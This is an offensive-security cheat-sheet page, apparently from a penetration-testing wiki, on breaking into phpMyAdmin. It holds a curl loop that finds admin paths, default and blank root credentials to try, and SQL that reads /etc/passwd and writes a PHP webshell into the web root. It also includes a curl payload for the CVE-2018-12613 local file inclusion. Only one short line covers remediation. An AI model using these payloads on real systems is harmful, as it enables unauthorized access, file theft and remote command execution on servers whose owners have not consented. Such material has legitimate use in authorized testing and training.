---
tags:
  - Web
---

# :material-database-cog: phpMyAdmin

<span class="pill pill-medium">DB console</span> <span class="pill pill-info">web</span>

A web front-end to MySQL/MariaDB. If you can log in, you're one SQL query away from
reading files, writing a webshell, or dumping every database.

!!! abstract "TL;DR"
    Find `/phpmyadmin` → try `root:<blank>` / weak creds → once in, use SQL to write
    a webshell (`INTO OUTFILE`) or read files (`LOAD_FILE`). Check version for LFI/RCE CVEs.

## :material-magnify: Identify

```bash
# common paths
for p in phpmyadmin pma _pma dbadmin mysql sql phpMyAdmin; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" http://$TARGET/$p/
done
curl -s http://$TARGET/phpmyadmin/README | grep -i version
curl -s http://$TARGET/phpmyadmin/ChangeLog | head
```

## :material-key: Access

```text
# Defaults / weak: root:<blank>, root:root, root:password
# config auth mode may allow blank passwords (AllowNoPassword)
# brute carefully — lockouts + logging
```

!!! loot "Logged in → file read/write via SQL"
    ```sql
    -- Read files (needs FILE priv, secure_file_priv off)
    SELECT LOAD_FILE('/etc/passwd');
    -- Write a webshell into the web root
    SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/s.php';
    ```
    Then browse to `/s.php?c=id`. See [SQLi → RCE](../web/sqli.md).

## :material-alert: CVEs

```text
# CVE-2018-12613 — LFI/RCE via ?target= (4.8.0-4.8.1)
curl "http://$TARGET/phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd"
# older setup-script RCE, XSRF-to-query issues — match the version
```

## :material-shield-check: Remediation

- Don't expose phpMyAdmin publicly; strong DB creds, no blank passwords; restrict
  by IP; patch; disable `FILE` privilege for app DB users.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- SQL → shell → [SQLi](../web/sqli.md), [Linux Privesc](../privesc/linux.md).
- Reference: [HackTricks phpMyAdmin](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html).
